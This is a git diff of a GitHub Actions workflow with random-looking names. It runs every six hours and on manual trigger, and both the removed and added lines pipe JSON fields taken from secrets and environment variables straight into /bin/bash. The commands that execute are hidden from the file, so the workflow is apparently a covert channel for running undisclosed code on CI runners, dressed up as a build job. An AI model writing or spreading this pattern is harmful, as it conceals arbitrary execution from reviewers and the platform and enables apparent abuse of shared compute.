@@ -2,29 +2,19 @@ name: fengshuting6712
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 2/6 * * *'
-
+    - cron: '39 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fengshuting6712
         env:
-          jwjz23: ${{ secrets.jwjz23 }}
+          wc84: ${{ secrets.wc84 }}
         run: |
-          echo $jwjz23 | jq -r .aubgq791 | /bin/bash
-          echo $ykmif036 | jq -r .eky04 | /bin/bash
-          echo $gtcnc515 | jq -r .ytlep40113 | /bin/bash
-          echo $islo104 | jq -r .n69 | /bin/bash
-          echo $n665 | jq -r .bvln50069 | /bin/bash
-          echo $dt1 | jq -r .w703 | /bin/bash
-          echo $tii16 | jq -r .eipcd3544 | /bin/bash
-          echo $oubv68907 | jq -r .njdcn0 | /bin/bash
-          echo $qfihe4 | jq -r .h20 | /bin/bash
-          echo $hjoxq26113 | jq -r .es4386 | /bin/bash
-          echo $aolhl21 | jq -r .bpkd30 | /bin/bash
-          echo $ahjg85 | jq -r .ee7099 | /bin/bash
-          echo $utd36 | jq -r .ozgz8456 | /bin/bash
-          echo $pmqgj53329 | jq -r .hwk074 | /bin/bash
+          echo $wc84 | jq -r .ghjor7427 | /bin/bash
+          echo $arkba869 | jq -r .sudj64534 | /bin/bash
+          echo $bayot72192 | jq -r .elopd71233 | /bin/bash
+          echo $bsal49708 | jq -r .xp94816 | /bin/bash
 
